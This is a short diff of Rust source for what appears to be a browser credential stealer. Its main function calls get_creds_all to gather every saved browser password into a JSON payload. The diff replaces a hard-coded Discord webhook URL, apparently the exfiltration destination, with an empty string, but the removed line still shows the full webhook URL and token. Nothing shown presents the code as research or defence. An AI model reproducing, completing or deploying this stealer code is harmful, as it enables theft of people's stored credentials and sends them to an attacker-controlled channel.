@@ -7,7 +7,7 @@ use browser::get_creds_all;
 
 fn main() {
 
-    const WEBHOOK: &str = "https://discord.com/api/webhooks/1205587694160449626/F4o8kDxAQpEdx2IiumVGLzgekIVSLU8jPMjKuFD1dTCNdPogGZzqpZ7PwLg4HAmxb9Jp";
+    const WEBHOOK: &str = "";
 
     let pass = get_creds_all().unwrap_or(Vec::new());
     let data = serde_json::json!({
